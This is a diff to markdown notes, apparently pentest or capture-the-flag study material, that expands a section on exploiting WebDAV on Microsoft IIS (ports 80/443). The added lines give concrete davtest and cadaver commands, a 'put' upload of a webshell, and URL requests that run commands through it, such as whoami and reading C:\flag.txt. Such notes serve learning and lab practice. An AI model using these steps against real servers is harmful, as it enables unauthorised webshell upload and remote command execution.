@@ -58,9 +58,13 @@ Requires username and password authentication.
 **Steps for exploitation**:
 1. Identifying Microsoft IIS Server
 2. Brute force authentication attacks:
-    - `davtest`
+    - `davtest -url http://<ip>/webdav`
+    - `davtest -auth <user>:<pass> -url http://<>/webdav`
 3. Upload files
-    - `cadaver`
+    - `cadaver http://<>`
+    - Once inside  webdav directory `put <path to webshell>`
+    - Once uploaded we can execute commands via url `http://<>/webdav/webshell.asp?cmd=whoami`
+    - `http://<>/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt`
 
 **Ports**: 80/443
 
